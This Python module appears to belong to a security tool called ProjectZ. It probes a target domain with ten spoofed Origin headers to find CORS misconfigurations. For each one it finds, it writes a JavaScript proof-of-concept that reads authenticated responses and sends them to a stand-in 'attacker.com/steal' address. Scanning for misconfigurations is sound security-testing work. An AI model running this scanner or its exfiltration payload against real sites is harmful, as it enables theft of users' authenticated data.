"""
ProjectZ - Module: CORS Misconfiguration Scanner
Tests for CORS misconfigurations that allow cross-origin attacks:
  - Wildcard with credentials (critical)
  - Origin reflection (any origin trusted)
  - Null origin trust
  - Subdomain wildcard trust
  - HTTP origin trusted on HTTPS endpoint
  - Pre-domain bypass (evil.target.com)
  - Post-domain bypass (target.com.evil.com)
  - Special char bypass (target.com_ / target.com!)
Tests both simple and preflight (OPTIONS) requests.
Returns: vuln type, PoC exploit code, severity.
Author: cyberhowler (R.G)
"""
from __future__ import annotations

import asyncio
import re
from typing import Optional

from src.core.engine import BaseModule
from src.core.http_client import fetch
from src.core.storage import cache, DatabaseManager
from src.core.config import config

# Probe origins to test
def _build_probe_origins(domain: str) -> list[dict]:
    return [
        {"origin": "https://evil.com",          "test": "arbitrary_origin"},
        {"origin": "null",                       "test": "null_origin"},
        {"origin": f"https://{domain}.evil.com", "test": "post_domain_bypass"},
        {"origin": f"https://evil{domain}",      "test": "pre_domain_bypass"},
        {"origin": f"http://{domain}",           "test": "http_origin_on_https"},
        {"origin": f"https://sub.{domain}",      "test": "subdomain_trust"},
        {"origin": f"https://{domain}!.evil.com","test": "special_char_bypass"},
        {"origin": f"https://{domain}_.evil.com","test": "underscore_bypass"},
        {"origin": "https://localhost",          "test": "localhost_trust"},
        {"origin": "https://127.0.0.1",          "test": "loopback_trust"},
    ]


class CORSCheckModule(BaseModule):
    MODULE_NAME = "cors"
    DESCRIPTION = "CORS misconfiguration scanner — 10 bypass techniques, PoC exploit generation"

    async def run(self) -> dict:
        domain = self._clean(self.target)
        base_url = f"https://{domain}"
        self.log.info(f"CORS scan: {domain}")

        cached = cache.get("cors", domain)
        if cached and not self.options.get("no_cache"):
            return cached

        result: dict = {
            "domain":            domain,
            "vulnerable":        False,
            "vulnerabilities":   [],
            "safe_configs":      [],
            "critical_findings": [],
            "poc":               [],
            "total":             0,
        }

        probe_origins = _build_probe_origins(domain)

        # Test multiple endpoints — APIs are common targets
        endpoints = [
            f"https://{domain}/",
            f"https://{domain}/api/",
            f"https://{domain}/api/v1/",
            f"https://{domain}/api/v2/",
        ]

        tasks = []
        for ep in endpoints[:2]:  # limit to 2 endpoints
            for probe in probe_origins:
                tasks.append(self._test_cors(ep, probe, domain))

        test_results = await asyncio.gather(*tasks, return_exceptions=True)

        seen_types = set()
        for tres in test_results:
            if not isinstance(tres, dict) or not tres.get("vulnerable"):
                continue
            test_type = tres.get("test_type", "unknown")
            if test_type in seen_types:
                continue
            seen_types.add(test_type)

            result["vulnerable"] = True
            result["vulnerabilities"].append(tres)

            sev = self._severity(tres)
            result["critical_findings"].append({
                "title":    f"CORS: {tres.get('label', test_type)}",
                "severity": sev,
                "detail":   tres.get("detail", ""),
                "endpoint": tres.get("url", ""),
            })

            poc = self._generate_poc(tres, domain)
            if poc:
                result["poc"].append(poc)
                self.log.found("CORS vuln", f"{sev.upper()} — {tres.get('label')}")

        result["total"] = len(result["vulnerabilities"])
        if result["vulnerable"]:
            self.log.warning(f"CORS vulnerable: {len(result['vulnerabilities'])} issues found")
        else:
            self.log.info(f"CORS: No critical misconfigurations found")

        cache.set("cors", domain, result)
        await self._persist_db(result)
        return result

    # ── Single CORS probe ──────────────────────────────────────────────────
    async def _test_cors(self, url: str, probe: dict, domain: str) -> dict:
        origin    = probe["origin"]
        test_type = probe["test"]
        extra_hdrs = {
            "Origin":                 origin,
            "Access-Control-Request-Method":  "GET",
            "Access-Control-Request-Headers": "Authorization, Content-Type",
        }
        try:
            resp = await fetch(
                url, timeout=8,
                extra_headers=extra_hdrs,
                return_headers=True,
            )
            if not isinstance(resp, dict):
                return {"vulnerable": False}

            resp_headers = {k.lower(): v for k, v in
                            (resp.get("headers", {}) or {}).items()}

            acao = resp_headers.get("access-control-allow-origin", "")
            acac = resp_headers.get("access-control-allow-credentials", "").lower()
            acam = resp_headers.get("access-control-allow-methods", "")

            if not acao:
                return {"vulnerable": False}

            vuln     = False
            label    = ""
            detail   = ""
            critical = False

            # Check 1: Wildcard with credentials
            if acao == "*" and acac == "true":
                vuln     = True
                critical = True
                label    = "Wildcard (*) with credentials=true"
                detail   = "ACAO: * combined with ACAC: true is a browser-rejected config BUT some non-browser clients still honor it"

            # Check 2: Origin reflected verbatim
            elif acao == origin and origin not in (f"https://{domain}", f"http://{domain}"):
                vuln   = True
                label  = "Origin reflected (any origin trusted)"
                detail = f"Server reflects arbitrary origin: {origin}"
                if acac == "true":
                    critical = True
                    label    = "Origin reflected + credentials=true (CRITICAL)"

            # Check 3: Null origin trusted
            elif acao == "null" or (origin == "null" and acao == "null"):
                vuln   = True
                label  = "Null origin trusted"
                detail = "Server trusts null origin — exploitable via sandboxed iframes"

            # Check 4: HTTP origin on HTTPS
            elif test_type == "http_origin_on_https" and acao.startswith("http://"):
                vuln  = True
                label = "HTTP origin trusted on HTTPS endpoint"
                detail = "Allows downgrade CORS bypass"

            if vuln:
                return {
                    "vulnerable":    True,
                    "url":           url,
                    "test_type":     test_type,
                    "label":         label,
                    "detail":        detail,
                    "critical":      critical,
                    "origin_tested": origin,
                    "acao":          acao,
                    "acac":          acac,
                    "acam":          acam,
                }
        except Exception:
            pass
        return {"vulnerable": False}

    def _severity(self, vuln: dict) -> str:
        if vuln.get("critical"):
            return "critical"
        acac = vuln.get("acac", "").lower()
        if acac == "true":
            return "critical"
        if "reflected" in vuln.get("test_type", ""):
            return "high"
        return "medium"

    def _generate_poc(self, vuln: dict, domain: str) -> Optional[dict]:
        origin = vuln.get("origin_tested", "https://evil.com")
        url    = vuln.get("url", f"https://{domain}/api/")
        label  = vuln.get("label", "CORS vulnerability")
        acac   = vuln.get("acac", "")

        cred_js = "credentials: 'include'," if acac == "true" else ""

        poc_js = f"""// CORS PoC — {label}
// Host this on: {origin}
fetch("{url}", {{
  method: "GET",
  {cred_js}
  headers: {{
    "Authorization": "Bearer YOUR_TOKEN"
  }}
}})
.then(r => r.text())
.then(data => {{
  // Data from {domain} sent to attacker
  new Image().src = "https://attacker.com/steal?data=" + btoa(data);
}});"""

        return {
            "type":      label,
            "severity":  self._severity(vuln),
            "poc_js":    poc_js,
            "endpoint":  url,
            "impact":    "Can steal authenticated data from " + domain
                         if acac == "true" else
                         "Can read unauthenticated responses from " + domain,
        }
